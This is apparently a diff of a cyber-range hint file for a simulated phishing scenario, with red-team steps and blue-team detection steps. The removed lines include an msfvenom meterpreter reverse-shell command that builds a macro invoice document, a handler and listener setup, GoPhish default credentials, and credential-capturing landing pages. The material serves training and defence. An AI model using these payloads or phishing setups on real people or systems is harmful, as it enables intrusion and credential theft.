@@ -3,150 +3,149 @@
     "red": {
       "1": {
         "L1": [
-          "Step 1: Effective phishing requires research. A generic email gets caught by spam filters and ignored by users. A targeted, specific pretext gets opened.",
-          "Step 2: OSINT (Open Source Intelligence) means gathering information from public sources: company websites, LinkedIn, job postings, press releases.",
-          "Step 3: For a logistics company, think about what emails employees normally receive: invoices, shipment notifications, delivery confirmations. Your pretext should fit their daily workflow."
+          "Step 1: This is a phishing simulation inside CyberSim only. Do not send anything to real people or real domains.",
+          "Step 2: Your first job is target research. A good pretext comes from the victim organization's normal work: invoices, shipments, delivery issues, helpdesk tickets, or password resets.",
+          "Step 3: Write down the simulated domain, likely email pattern, target role, and pretext idea before touching GoPhish."
         ],
         "L2": [
-          "Step 1: Use OSINT tools to enumerate the target domain. Find email naming conventions (firstname.lastname@, flastname@, etc.), employee names, and job titles.",
-          "Step 2: Check the GoPhish admin interface at 172.20.3.40:3333 — it may have pre-configured target lists and templates for this scenario.",
-          "Step 3: A logistics company invoice or shipment update is the most natural pretext. Include specific details (tracking numbers, amounts) to increase credibility."
+          "Step 1: Scope the scenario network: mail relay 172.20.3.20, victim endpoint 172.20.3.30, GoPhish 172.20.3.40.",
+          "Step 2: Gather simulated OSINT for Orion Logistics. Look for employee names, department names, email formats, and business language you can reuse in the pretext.",
+          "Step 3: Choose one target persona and one believable reason for the email. Keep it simple: invoice approval, shipment exception, or helpdesk verification."
         ],
         "L3": [
-          "Step 1: Run `theHarvester -d orion-logistics.local -b all` to enumerate emails and subdomains.",
-          "Step 2: Access GoPhish admin: `curl http://172.20.3.40:3333` — check for pre-configured targets and templates.",
-          "Step 3: Note the email format, any employee names, and the company domain. These inform your phishing pretext.",
-          "Step 4: Document your OSINT findings in the notebook with #finding tags — this is the 'Intelligence Gathering' phase of your methodology."
+          "Step 1: Run `theHarvester -d orion-logistics.local -b all` if available. If the tool returns little data, document that result and use the scenario-provided persona.",
+          "Step 2: Check GoPhish reachability with `curl http://172.20.3.40:3333` and note whether the admin UI responds.",
+          "Step 3: Draft a one-sentence pretext: who is sending, why the recipient expects it, what action is requested, and what urgency is present.",
+          "Step 4: Add a #finding note with the target persona, email format, chosen pretext, and why it fits Orion Logistics."
         ]
       },
       "2": {
         "L1": [
-          "Step 1: A phishing campaign has three components: the email template (what the target sees), the sending profile (how it's delivered), and the landing page or payload (what happens when they click).",
-          "Step 2: GoPhish manages all three. The sending profile connects to an SMTP server (Postfix at 172.20.3.20). The template is the email content. The landing page captures credentials or serves a payload.",
-          "Step 3: Tracking is critical — GoPhish embeds tracking pixels and unique links so you can measure: who opened, who clicked, who submitted credentials."
+          "Step 1: A campaign has four parts: sending profile, email template, landing page, and target group.",
+          "Step 2: Build them in that order. If the SMTP sending profile is wrong, the rest of the campaign cannot deliver.",
+          "Step 3: Tracking matters. You need to measure sent, opened, clicked, submitted, and callback/execution events."
         ],
         "L2": [
-          "Step 1: In GoPhish, configure a Sending Profile that uses the Postfix relay at 172.20.3.20:25. This sends emails that appear to come from the orion-logistics domain.",
-          "Step 2: Create or select an email template. Use a logistics-themed pretext: 'Invoice #INV-2026-0412 requires your approval.' Include urgency cues.",
-          "Step 3: Set up a landing page that mimics the Orion Logistics login portal. GoPhish captures submitted credentials automatically."
+          "Step 1: Use GoPhish at 172.20.3.40:3333 and the internal SMTP relay at 172.20.3.20:25.",
+          "Step 2: The email should match your Phase 1 pretext. Keep the action clear and realistic, and avoid overcomplicated wording.",
+          "Step 3: The landing page should be a simulated Orion login or document portal. It must stay inside the lab and use simulated credentials only."
         ],
         "L3": [
-          "Step 1: Access GoPhish admin at http://172.20.3.40:3333 (default creds are usually admin:gophish or check the scenario docs).",
-          "Step 2: Create Sending Profile: SMTP host = 172.20.3.20:25, From = it-support@orion-logistics.local",
-          "Step 3: Create or select the 'Orion_Q4_Invoice' email template. Enable tracking.",
-          "Step 4: Create a landing page that captures username/password. Import from URL if available, or build a simple form.",
-          "Step 5: Document your campaign setup as #evidence — the sending profile, template, and landing page configuration."
+          "Step 1: Open GoPhish at `http://172.20.3.40:3333`. Use the scenario-provided credentials or the lab default shown in the container docs if prompted.",
+          "Step 2: Create Sending Profile: SMTP host `172.20.3.20:25`, from address under `orion-logistics.local`, and a clear display name.",
+          "Step 3: Create or select a target group with simulated recipients only.",
+          "Step 4: Create an email template tied to your pretext. Include one tracked link to the lab landing page.",
+          "Step 5: Create a landing page that captures username/password in GoPhish. Screenshot or note each setting as #evidence."
         ]
       },
       "3": {
         "L1": [
-          "Step 1: For maximum impact, you need a payload that executes when the target interacts with it. Document-based payloads (macro-enabled Word/Excel) are the most common real-world vector.",
-          "Step 2: A reverse shell payload 'calls home' to your machine. You set up a listener first, then when the payload executes, you get a command shell on the victim's machine.",
-          "Step 3: The payload must look legitimate — an invoice.docm (macro-enabled Word) is natural for a logistics company."
+          "Step 1: Payload crafting in this scenario is simulated and must stay inside the CyberSim network.",
+          "Step 2: Start the listener before delivering the payload. If the victim executes first and no listener is ready, you miss the callback.",
+          "Step 3: Record payload type, listener IP, listener port, and expected victim IP before launching."
         ],
         "L2": [
-          "Step 1: Generate a reverse TCP payload using msfvenom. The format should match your pretext — .docm for an invoice.",
-          "Step 2: Set LHOST to your Kali IP on the scenario network, LPORT to 4444 (or any available port).",
-          "Step 3: Before launching the campaign, start a listener on your machine to receive the callback."
+          "Step 1: Use Kali as the listener host on the scenario network. The victim endpoint is 172.20.3.30.",
+          "Step 2: Keep the payload aligned to the pretext. For an invoice scenario, a document-style payload or simulated attachment marker is easier to explain.",
+          "Step 3: Use a low-noise proof after callback: whoami, hostname, and basic IP information are enough."
         ],
         "L3": [
-          "Step 1: Generate payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.20.3.10 LPORT=4444 -f docm -o invoice_Q4.docm`",
-          "Step 2: Start listener: open a new terminal and run `nc -lvp 4444` or use msfconsole: `msfconsole -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 172.20.3.10; set LPORT 4444; run'`",
-          "Step 3: Attach the payload to your GoPhish campaign email template, or host it on the landing page.",
-          "Step 4: Document: payload type, LHOST, LPORT, file hash. Tag as #evidence."
+          "Step 1: Set listener details first: Kali listener IP should be the attacker address in the SC-03 network, commonly 172.20.3.10, and a lab port such as 4444.",
+          "Step 2: If the lab expects a generated document payload, create it only for this isolated target and save its filename/hash as evidence.",
+          "Step 3: Start the listener before campaign launch, for example with the lab-approved netcat or handler workflow.",
+          "Step 4: Write a #evidence note containing payload filename, hash if available, listener IP/port, and the expected callback source 172.20.3.30."
         ]
       },
       "4": {
         "L1": [
-          "Step 1: Everything is set up — pretext, template, payload, listener. Launching the campaign sends the emails. GoPhish will track delivery, opens, and clicks in real time.",
-          "Step 2: The callback on your listener is the proof of execution. When the victim opens the document and enables macros, your reverse shell fires.",
-          "Step 3: Post-access: run basic commands to prove the level of access you achieved. whoami, hostname, ipconfig — these prove you have a shell on the target."
+          "Step 1: Launch only after the pretext, target group, landing page, and listener are ready.",
+          "Step 2: Watch two places at the same time: GoPhish for delivery/open/click/submission, and your listener for callback.",
+          "Step 3: If nothing happens, troubleshoot in order: SMTP sending profile, target group, landing page URL, then listener address."
         ],
         "L2": [
-          "Step 1: Launch the campaign in GoPhish. Monitor the dashboard for email delivery confirmations, tracking pixel fires (opens), and link clicks.",
-          "Step 2: Watch your listener — a connection from 172.20.3.30 (the victim endpoint) confirms successful execution.",
-          "Step 3: On the shell, gather proof: system info, user info, network info. Document everything."
+          "Step 1: In GoPhish, verify the campaign uses the correct template, target group, sending profile, and landing page.",
+          "Step 2: After launch, build the evidence chain: sent -> opened -> clicked -> submitted -> callback.",
+          "Step 3: When callback arrives from 172.20.3.30, run only basic proof commands and stop. You are proving initial access, not lateral movement."
         ],
         "L3": [
-          "Step 1: In GoPhish: Campaigns → New Campaign → select template, targets, sending profile → Launch.",
-          "Step 2: Monitor GoPhish dashboard: watch for 'Email Sent' → 'Email Opened' → 'Clicked Link' progression.",
-          "Step 3: Watch your listener terminal. When you see a connection: run `whoami`, `hostname`, `ipconfig`.",
-          "Step 4: Take screenshots / document the shell session. Tag as #evidence. This is your primary proof of campaign success."
+          "Step 1: Launch the GoPhish campaign and monitor the dashboard for Sent, Opened, Clicked, and Submitted Data.",
+          "Step 2: Watch the listener. A connection from the victim endpoint 172.20.3.30 is the key success signal.",
+          "Step 3: On callback, collect minimal proof such as whoami, hostname, and IP configuration. Do not pivot to other hosts.",
+          "Step 4: Submit the reverse-shell callback flag when the platform exposes it, then document the full timeline as #evidence."
         ]
       },
       "5": {
         "L1": [
-          "Step 1: The phishing simulation report is your deliverable. It quantifies the organization's human security risk with real data.",
-          "Step 2: Key metrics: delivery rate, open rate, click rate, execution rate. Compare against industry benchmarks (typically 20-30% click rate for untrained users).",
-          "Step 3: Recommendations should be specific and actionable: security awareness training, DMARC enforcement, email gateway improvements."
+          "Step 1: The report should explain human-risk findings, not just tool output.",
+          "Step 2: Report metrics: delivery rate, open rate, click rate, credential submission rate, and execution/callback rate.",
+          "Step 3: Recommendations must reduce risk: awareness training, DMARC enforcement, attachment sandboxing, and stronger reporting workflow."
         ],
         "L2": [
-          "Step 1: Pull campaign statistics from GoPhish: emails sent, opened, clicked, submitted.",
-          "Step 2: Calculate rates and compare to benchmarks. A >30% click rate indicates critical need for security awareness training.",
-          "Step 3: Write recommendations: DMARC policy set to p=reject, mandatory security awareness training quarterly, email gateway sandbox for attachments."
+          "Step 1: Export or copy GoPhish results for every stage of the campaign funnel.",
+          "Step 2: Turn raw counts into percentages. Example: click rate = clicked / delivered * 100.",
+          "Step 3: Separate human behavior findings from technical control findings, such as missing DMARC or lack of attachment sandboxing."
         ],
         "L3": [
-          "Step 1: Export GoPhish campaign results. Calculate: click_rate = clicks/sent * 100.",
-          "Step 2: Structure report: Executive Summary → Campaign Parameters → Results → Technical Gaps → Recommendations.",
-          "Step 3: Key recommendations: enforce DMARC p=reject, deploy email sandbox for attachments, quarterly phishing simulation testing, mandatory security awareness training.",
-          "Step 4: Use the report builder to export. Ensure all #finding and #evidence tags are included."
+          "Step 1: Build this report structure: Executive Summary, Scope, Pretext, Campaign Configuration, Results, Technical Observations, Recommendations.",
+          "Step 2: Include a table with sent, opened, clicked, submitted, and callback counts and percentages.",
+          "Step 3: Add remediation: DMARC policy to reject, SPF/DKIM alignment, email gateway attachment sandbox, user reporting button, and quarterly phishing simulation.",
+          "Step 4: Confirm all notebook items are tagged with #finding, #evidence, #ioc, or #remediation before exporting."
         ]
       }
     },
     "blue": {
       "1": {
         "L1": [
-          "Step 1: A suspicious email has been reported. Your first task is to verify whether it's legitimately from the claimed sender by checking email authentication headers.",
-          "Step 2: Three protocols protect email authenticity: SPF (authorized sending IPs), DKIM (cryptographic signature), and DMARC (policy alignment). A spoofed email will fail at least one.",
-          "Step 3: Also check: does the Reply-To match the From? Is the sender domain slightly misspelled (homograph attack)? Are there unusual attachment types?"
+          "Step 1: Begin with the email itself. Your first question is: did this message really come from the sender it claims?",
+          "Step 2: Check SPF, DKIM, and DMARC. Failures or alignment problems are strong phishing indicators.",
+          "Step 3: Also check sender, reply-to, subject, attachment name, URL domain, and recipient count."
         ],
         "L2": [
-          "Step 1: Examine the email headers. Look for Authentication-Results showing SPF, DKIM, and DMARC pass/fail status.",
-          "Step 2: Check if the sending IP matches the domain's SPF record. A 'softfail' or 'fail' result indicates the email wasn't sent from an authorized server.",
-          "Step 3: Determine scope: how many employees received this email? Search the mail logs for the same subject line or sender."
+          "Step 1: Search mail/SIEM events for the reported subject or sender.",
+          "Step 2: Determine scope: how many simulated users received the message, who opened it, who clicked, and who submitted data.",
+          "Step 3: Record sender IP, sender domain, target users, subject, URLs, attachment names, and authentication results as #ioc notes."
         ],
         "L3": [
-          "Step 1: In the SIEM, filter for mail-related events. Look for the subject line or sender address.",
-          "Step 2: In the terminal: `grep 'invoice' /var/log/mail.log | head -20` to find the relevant email entries.",
-          "Step 3: Check the authentication results: `grep -A5 'Authentication-Results' /var/log/mail.log | grep -E 'spf|dkim|dmarc'`",
-          "Step 4: Count recipients: `grep '<subject>' /var/log/mail.log | grep 'to=' | wc -l`. Document: sender IP, authentication results, recipient count as #ioc and #finding."
+          "Step 1: Filter the SIEM for mail or phishing events. If logs are available, search `/var/log/mail.log` for the subject, sender, or Orion domain.",
+          "Step 2: Review Authentication-Results for SPF, DKIM, and DMARC pass/fail status.",
+          "Step 3: Count recipients and actions if the telemetry is available: delivered, opened, clicked, submitted.",
+          "Step 4: Write an initial #finding: suspected phishing campaign, sender identity, affected recipients, and current confidence."
         ]
       },
       "2": {
         "L1": [
-          "Step 1: If the phishing email was opened, you need to determine if the payload executed. Macro execution in Office documents spawns child processes — that's the detection point.",
-          "Step 2: Event 4688 (Process Creation) shows process parent-child relationships. WINWORD.EXE spawning cmd.exe or powershell.exe is the definitive macro execution indicator.",
-          "Step 3: PowerShell script block logging (Event 4104) captures the actual commands executed — look for download cradles (IEX, DownloadString, WebClient)."
+          "Step 1: Now decide whether the phishing email caused execution. Clicks are bad, but process execution is worse.",
+          "Step 2: Look for Office or browser processes spawning shells, script interpreters, or network callbacks.",
+          "Step 3: The important endpoint in this lab is 172.20.3.30. Correlate user action time with endpoint telemetry."
         ],
         "L2": [
-          "Step 1: Search for Event 4688 where the parent process is a Microsoft Office application. Any Office process spawning a shell is suspicious.",
-          "Step 2: If PowerShell was used, Event 4104 captures the full script. Look for encoded commands (Base64) and network download functions.",
-          "Step 3: Check for persistence: Event 4698 (Scheduled Task Created) or Event 7045 (Service Installed) after the macro execution timestamp."
+          "Step 1: Search for process creation and script execution events around the click time.",
+          "Step 2: Suspicious parent-child relationships include WINWORD/EXCEL spawning cmd, powershell, wscript, cscript, or network tools.",
+          "Step 3: Search for outbound connections from 172.20.3.30 to the attacker/listener port. A callback confirms initial access."
         ],
         "L3": [
-          "Step 1: Search SIEM for process creation events: filter for 'WINWORD' or '4688' in events.",
-          "Step 2: In terminal: `grep '4688' /var/log/scenario/security.log | grep -i 'word\\|excel' | head -10`",
-          "Step 3: Check for PowerShell activity: `grep '4104' /var/log/scenario/security.log | grep -i 'download\\|IEX\\|webclient'`",
-          "Step 4: If execution confirmed: note the affected hostname, user, timestamp, and C2 callback IP. Escalate to CRITICAL. Tag as #finding."
+          "Step 1: In SIEM, search for process creation events around the phishing click timestamp.",
+          "Step 2: Look for terms such as 4688, WINWORD, EXCEL, powershell, cmd, macro, script, or callback.",
+          "Step 3: Search network logs for connections from 172.20.3.30 to the attacker IP and listener port.",
+          "Step 4: If execution is confirmed, document affected host, affected user, process chain, callback IP/port, and timestamp as a critical #finding."
         ]
       },
       "3": {
         "L1": [
-          "Step 1: Execution confirmed — the endpoint has an active C2 connection. Containment must be fast but careful. Sequence: preserve evidence → block C2 → isolate host → reset credentials.",
-          "Step 2: Capturing volatile evidence (running processes, network connections) BEFORE isolation is critical — once you isolate, some evidence disappears.",
-          "Step 3: Block the C2 IP at the perimeter firewall, not just on the endpoint. The attacker may have compromised the endpoint's local firewall."
+          "Step 1: Containment order: preserve evidence, block callback, isolate affected endpoint, reset affected credentials.",
+          "Step 2: Capture volatile evidence before isolation if the scenario provides it. Process lists and active connections can disappear.",
+          "Step 3: After containment, verify no other simulated hosts contacted the same callback destination."
         ],
         "L2": [
-          "Step 1: Capture volatile evidence: running processes and active network connections on the compromised host.",
-          "Step 2: Block the C2 server IP at the perimeter firewall. Check if any other hosts are communicating with the same IP.",
-          "Step 3: Isolate the compromised endpoint at the network level. Force password resets for any accounts that were active on that machine."
+          "Step 1: Preserve mail logs, GoPhish/SIEM events, endpoint process telemetry, and network connection records.",
+          "Step 2: Block the callback destination at the firewall or gateway level, not only on the endpoint.",
+          "Step 3: Isolate 172.20.3.30, reset any submitted credentials, and search for additional recipients who clicked."
         ],
         "L3": [
-          "Step 1: Evidence capture (if accessible): `netstat -ano | grep ESTABLISHED` and `tasklist /v` on the endpoint.",
-          "Step 2: Identify C2 IP from network events: `grep 'ESTABLISHED.*:4444' /var/log/scenario/connections.log`",
-          "Step 3: Document the C2 IP, affected hostname, and affected user account as #ioc entries.",
-          "Step 4: Containment actions for your report: firewall block rule, endpoint isolation, credential reset list. Write up as #remediation.",
-          "Step 5: Check for lateral movement: did the compromised account access any other hosts? Search for its username in 4624 events."
+          "Step 1: Create #ioc notes for sender address, sender IP, subject, URL, attachment, victim host, callback IP, and callback port.",
+          "Step 2: Write containment actions: block callback destination, isolate host 172.20.3.30, disable submitted credentials, preserve logs.",
+          "Step 3: Hunt for spread: search for the same subject, URL, attachment hash, and callback destination across all simulated users.",
+          "Step 4: Finish with #remediation: DMARC reject policy, attachment sandboxing, macro restrictions, report-phish button, and user training."
         ]
       }
     }
